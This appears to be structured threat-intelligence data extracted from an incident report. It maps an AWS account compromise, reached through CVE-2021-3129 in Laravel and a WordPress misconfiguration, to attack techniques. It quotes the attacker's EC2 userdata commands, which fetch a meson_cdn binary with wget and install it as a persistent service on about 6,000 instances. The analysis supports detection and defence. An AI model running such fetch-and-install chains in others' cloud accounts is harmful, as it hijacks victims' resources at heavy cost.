techniques.evidence_quote: The attacker exploited CVE-2021-3129 in a Laravel application and a misconfiguration in WordPress to gain initial access to the cloud account.

techniques.technique_name: Command and Scripting Interpreter: Unix Shell
techniques.evidence_quote:
wget 'https://staticassets.meson.network/public/meson_cdn/v3.1.20/meson_cdn-linux-amd64.tar.gz' && tar -zxf meson_cdn-linux-amd64.tar.gz && rm -f meson_cdn-linux-amd64.tar.gz && cd ./meson_cdn-linux-amd64 && sudo ./service install meson_cdn
sudo ./meson_cdn config set --token=**** --https_port=443 --cache.size=30
sudo ./service start meson_cdn
sudo ./service install meson_cdn ... sudo ./service start meson_cdn
"minCount": 500, "account": 500 ... Within minutes, the attacker was able to spawn almost 6,000 instances inside the compromised account across multiple regions
Following initial access, the attacker used automated reconnaissance techniques to instantly uncover a lay of the land. They then used the privileges they identified for the compromised users.

we estimate a cost of more than $2,000 per day for all the Meson network nodes created, even just using micro sizes. This isn't counting the potential costs for public IP addresses which could run as much as $22,000 a month for 6,000 nodes!

attack_chain.description: Attacker exploited CVE-2021-3129 in an exposed Laravel application and a WordPress misconfiguration to gain initial access to the AWS cloud account credentials.
attack_chain.evidence_quote: The attacker exploited CVE-2021-3129 in a Laravel application and a misconfiguration in WordPress to gain initial access to the cloud account.

attack_chain.description: Immediately after gaining access, the attacker ran automated reconnaissance to enumerate available cloud services, regions, and IAM privileges associated with the compromised account users.
attack_chain.evidence_quote: Following initial access, the attacker used automated reconnaissance techniques to instantly uncover a lay of the land. They then used the privileges they identified for the compromised users.

attack_chain.technique_name: Modify Cloud Compute Infrastructure: Create Cloud Instance
attack_chain.description: Using the Boto3 SDK via Python scripts, the attacker called RunInstances across multiple AWS regions to spin up ~6,000 micro-sized EC2 instances (batches of 500 per region) using a public Ubuntu 22.04 AMI.
attack_chain.evidence_quote: "minCount": 500, "account": 500 ... Within minutes, the attacker was able to spawn almost 6,000 instances inside the compromised account across multiple regions

attack_chain.technique_name: Command and Scripting Interpreter: Unix Shell
attack_chain.description: A malicious shell script was embedded in the EC2 userdata field. On each instance boot, it downloaded the meson_cdn binary via wget, extracted it, installed it as a systemd service, and started it — automatically enrolling each node into the attacker's Meson Network account.
attack_chain.evidence_quote:
wget 'https://staticassets.meson.network/public/meson_cdn/v3.1.20/meson_cdn-linux-amd64.tar.gz' && tar -zxf meson_cdn-linux-amd64.tar.gz && rm -f meson_cdn-linux-amd64.tar.gz && cd ./meson_cdn-linux-amd64 && sudo ./service install meson_cdn
sudo ./meson_cdn config set --token=**** --https_port=443 --cache.size=30
sudo ./service start meson_cdn

attack_chain.description: The meson_cdn binary was installed and started as a persistent systemd service on each EC2 instance, ensuring it survived reboots and continued contributing bandwidth and storage to the attacker's Meson Network nodes.
attack_chain.evidence_quote: sudo ./service install meson_cdn ... sudo ./service start meson_cdn

attack_chain.description: Each of the ~6,000 EC2 nodes ran the meson_cdn process, consuming victim-account bandwidth and storage to earn Meson Network tokens (MSN) for the attacker, costing the victim over $2,000/day in compute and up to $22,000/month in public IP charges.
attack_chain.evidence_quote: we estimate a cost of more than $2,000 per day for all the Meson network nodes created, even just using micro sizes. This isn't counting the potential costs for public IP addresses which could run as much as $22,000 a month for 6,000 nodes!

initial_access_vector: Exploitation of CVE-2021-3129 (Laravel debug mode RCE) and a WordPress misconfiguration in publicly exposed honeynet web applications, yielding AWS account credentials.
persistence_mechanism: meson_cdn binary installed as a systemd service via EC2 userdata on each of ~6,000 spun-up instances, automatically starting on boot.
privilege_escalation: Attacker leveraged the IAM privileges already attached to the compromised cloud account users — no explicit privilege escalation beyond the initial foothold was described.
